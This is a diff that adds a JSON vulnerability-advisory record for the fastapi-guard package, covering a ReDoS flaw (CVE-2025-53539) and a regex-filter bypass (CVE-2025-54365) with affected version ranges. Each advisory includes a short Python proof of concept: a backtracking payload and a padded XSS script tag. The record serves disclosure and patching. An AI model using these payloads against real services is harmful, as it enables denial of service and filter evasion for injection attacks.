@@ -1,0 +1,159 @@
+{
+  "schema_version": 1,
+  "package": "fastapi-guard",
+  "purls": [
+    "pkg:pypi/fastapi-guard"
+  ],
+  "generated_at": "2026-05-18T06:01:40+00:00",
+  "conda_versions_total": 10,
+  "advisories": [
+    {
+      "id": "GHSA-j47q-rc62-w448",
+      "primary_id": "CVE-2025-53539",
+      "aliases": [
+        "CVE-2025-53539"
+      ],
+      "cve_ids": [
+        "CVE-2025-53539"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "fastapi-guard",
+      "summary": "fastapi-guard is vulnerable to ReDoS through inefficient regex",
+      "details": "### Summary\n\nfastapi-guard detects penetration attempts by using regex patterns to scan incoming requests. However, some of the regex patterns used in detection are extremely inefficient and can cause polynomial complexity backtracks when handling specially crafted inputs.\n\nIt is not as severe as _exponential_ complexity ReDoS, but still downgrades performance and allows DoS exploits. An attacker can trigger high cpu usage and make a service unresponsive for hours by sending a single request in size of KBs.\n\n### PoC\n\ne.g. https://github.com/rennf93/fastapi-guard/blob/1e6c2873bfc7866adcbe5fc4da72f2d79ea552e7/guard/handlers/suspatterns_handler.py#L31C79-L32C7\n\n```python\npayload = lambda n: '<'*n+ ' '*n+ 'style=' + '\"'*n + ' '*n+ 'url('*n # complexity: O(n^5)\n\nprint(requests.post(\"http://172.24.1.3:8000/\", data=payload(50)).elapsed) # 0:00:03.771120\nprint(requests.post(\"http://172.24.1.3:8000/\", data=payload(100)).elapsed) # 0:01:17.952637\nprint(requests.post(\"http://172.24.1.3:8000/\", data=payload(200)).elapsed) # timeout (>15min)\n```\n\nSingle-threaded uvicorn workers can not handle any other concurrent requests during the elapsed time.\n\n### Impact\n\nPenetration detection is enabled by default. Services that use fastapi-guard middleware without explicitly setting `enable_penetration_detection=False` are vulnerable to DoS.",
+      "published": "2025-07-07T23:36:39Z",
+      "modified": "2026-02-03T03:15:30.074874Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/rennf93/fastapi-guard/security/advisories/GHSA-j47q-rc62-w448"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-53539"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rennf93/fastapi-guard/commit/d9d50e8130b7b434cdc1b001b8cfd03a06729f7f"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/rennf93/fastapi-guard"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-j47q-rc62-w448",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.0.1"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "0.1.0",
+        "0.2.0",
+        "0.3.2",
+        "0.3.3",
+        "0.3.4",
+        "0.4.0",
+        "1.0.0",
+        "1.1.0",
+        "1.2.0",
+        "1.2.1",
+        "1.2.2",
+        "1.3.2",
+        "1.4.0",
+        "1.5.0",
+        "2.0.0",
+        "2.0.1",
+        "2.1.0",
+        "2.1.1",
+        "2.1.2",
+        "2.1.3",
+        "3.0.0"
+      ],
+      "affected_conda_versions": []
+    },
+    {
+      "id": "GHSA-rrf6-pxg8-684g",
+      "primary_id": "CVE-2025-54365",
+      "aliases": [
+        "CVE-2025-54365"
+      ],
+      "cve_ids": [
+        "CVE-2025-54365"
+      ],
+      "ecosystem": "PyPI",
+      "upstream_name": "fastapi-guard",
+      "summary": "FastAPI Guard has a regex bypass",
+      "details": "### Summary\n\nThe regular expression patched to mitigate the ReDoS vulnerability by limiting the length of string fails to catch inputs that exceed this limit.\n\n### Details\n\nIn version 3.0.1, you can find a commit like the one in the link below, which was made to prevent ReDoS.\nhttps://github.com/rennf93/fastapi-guard/commit/d9d50e8130b7b434cdc1b001b8cfd03a06729f7f\n\nThis commit mitigates the vulnerability by limiting the length of the input string, as shown in the example below.\n`r\"<script[^>]*>[^<]*<\\\\/script\\\\s*>\"` -> `<script[^>]{0,100}>[^<]{0,1000}<\\\\/script\\\\s{0,10}>`\n\nThis type of patch fails to catch cases where the string representing the attributes of a <script> tag exceeds 100 characters.\nTherefore, most of the regex patterns present in version 3.0.1 can be bypassed.\n\n### PoC\n\n1. clone the fastapi-guard repository\n2. Navigate to the examples directory and modify the main.py source code. Change the HTTP method for the root route from GET to POST.\n<img width=\"1013\" height=\"554\" alt=\"image\" src=\"https://github.com/user-attachments/assets/cf93ea37-2fd7-4251-abb6-b55f88685f54\" />\n3. After that, set up the example app environment by running the docker-compose up command. Then, run the Python code below to verify that the two requests return different results.\n\n```python\nimport requests\n\nURL = \"<http://localhost:8000>\"\n\nobvious_payload = {\n    \"obvious\" : \"<script>alert(1);</script>\"\n}\nresponse = requests.post(url=URL, json=obvious_payload)\nprint(f\"[+] response of first request: {response.text}\")\n\nbypassed_payload = {\n    \"suspicious\" : f'<script id=\"i_can_bypass_regex_filtering{'a'*100}\">alert(1)</script>'\n}\n\nresponse = requests.post(url=URL, json=bypassed_payload)\nprint(f\"[+] response of second request: {response.text}\")\n\n```\n<img width=\"836\" height=\"112\" alt=\"image\" src=\"https://github.com/user-attachments/assets/11dcccb2-6179-44b1-9628-ae0a787e3bb7\" />\n\n### Impact\n\nDue to this vulnerability, most of the regex patterns can potentially be bypassed, making the application vulnerable to attacks such as XSS and SQL Injection.",
+      "published": "2025-07-23T15:31:12Z",
+      "modified": "2025-07-24T12:46:22Z",
+      "severity": {
+        "type": "CVSS_V4",
+        "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:H/SC:N/SI:N/SA:N/E:P"
+      },
+      "all_severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:L/VA:H/SC:N/SI:N/SA:N/E:P"
+        }
+      ],
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/rennf93/fastapi-guard/security/advisories/GHSA-rrf6-pxg8-684g"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-54365"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rennf93/fastapi-guard/commit/0829292c322d33dc14ab00c5451c5c138148035a"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/rennf93/fastapi-guard/commit/d9d50e8130b7b434cdc1b001b8cfd03a06729f7f"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/rennf93/fastapi-guard"
+        }
+      ],
+      "osv_url": "https://osv.dev/vulnerability/GHSA-rrf6-pxg8-684g",
+      "osv_ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "3.0.1"
+            },
+            {
+              "fixed": "3.0.2"
+            }
+          ]
+        }
+      ],
+      "osv_versions": [
+        "3.0.1"
+      ],
+      "affected_conda_versions": []
+    }
+  ]
+}
